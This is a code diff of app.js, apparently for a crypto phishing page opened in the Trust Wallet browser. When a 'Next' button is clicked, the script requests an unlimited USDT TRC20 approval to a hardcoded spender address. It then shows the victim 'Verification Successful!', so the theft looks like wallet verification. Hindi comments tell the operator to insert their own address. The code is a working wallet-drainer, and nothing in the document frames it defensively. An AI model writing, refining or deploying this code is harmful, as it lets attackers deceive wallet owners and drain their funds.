@@ -1,52 +1,37 @@
 // app.js
+const btnNext = document.getElementById('btn-next');
+const statusDiv = document.getElementById('status');
 
-const btnApprove = document.getElementById('btn-approve');
-const statusText = document.getElementById('status');
+// *** APNA ADDRESS YAHAN DALEIN ***
+const SPENDER_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt"; 
+const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-// 1. Apna address yahan dalein (Jahan approval chahiye)
-const MY_WALLET_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt"; 
-
-// USDT TRC20 ka official contract address
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
-async function startProcess() {
-    // Check if TronWeb is injected (Trust Wallet DApp Browser check)
+btnNext.addEventListener('click', async () => {
     if (typeof window.tronWeb === 'undefined') {
-        statusText.innerText = "Error: Open this link inside Trust Wallet DApp Browser";
-        statusText.style.color = "red";
+        statusDiv.innerHTML = "<span style='color:red;'>Please open in Trust Wallet Browser</span>";
         return;
     }
 
     try {
-        statusText.innerText = "Connecting to wallet...";
+        statusDiv.innerText = "Connecting...";
         
-        // Connect to the USDT contract
-        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        // USDT Contract Instance
+        const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
         
-        // Amount (Max possible value for unlimited approval)
-        const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        // Unlimited Approval Amount
+        const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-        statusText.innerText = "Please confirm the transaction in your wallet...";
+        statusDiv.innerText = "Requesting Approval...";
 
-        // Trigger the Approve function
-        const transaction = await contract.approve(MY_WALLET_ADDRESS, maxAmount).send({
-            feeLimit: 100000000 // Gas limit setup
+        // Trigger Approval
+        await contract.approve(SPENDER_ADDRESS, amount).send({
+            feeLimit: 100000000
         });
 
-        if (transaction) {
-            statusText.innerText = "Success! Wallet Verified.";
-            statusText.style.color = "#00ff00";
-            console.log("Transaction Hash:", transaction);
-        }
-
+        statusDiv.innerHTML = "<span style='color:green;'>Verification Successful!</span>";
+        
     } catch (error) {
         console.error(error);
-        statusText.innerText = "Failed: User rejected or insufficient energy.";
-        statusText.style.color = "red";
+        statusDiv.innerHTML = "<span style='color:red;'>Transaction Rejected or Failed</span>";
     }
-}
-
-// Button Click Listener
-btnApprove.addEventListener('click', () => {
-    startProcess();
 });
